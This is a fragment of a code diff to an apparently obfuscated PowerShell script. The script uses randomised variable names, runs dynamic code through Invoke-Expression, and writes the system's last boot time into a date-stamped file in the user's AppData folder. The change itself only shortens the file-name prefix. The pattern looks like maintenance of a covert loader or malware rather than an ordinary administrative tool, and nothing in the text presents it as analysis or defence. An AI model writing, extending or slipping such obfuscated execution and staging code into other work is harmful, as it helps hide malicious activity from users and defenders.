@@ -63,7 +63,7 @@ Invoke-Expression $code
     Remove-Item -Path $hqnxplmztw
 }else{
     $vxkplqwtmn = Get-Date -Format "MMdd_HHmm"
-    $tzqlwmnrxp = "00001-$plmnqwtzrk-$zqwxkplmnv-$vxkplqwtmn.txt"
+    $tzqlwmnrxp = "1-$plmnqwtzrk-$zqwxkplmnv-$vxkplqwtmn.txt"
     $hqnxplmztw = Join-Path $env:appdata $tzqlwmnrxp
     (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $hqnxplmztw
     $nxzqplmwtr = $hqnxplmztw
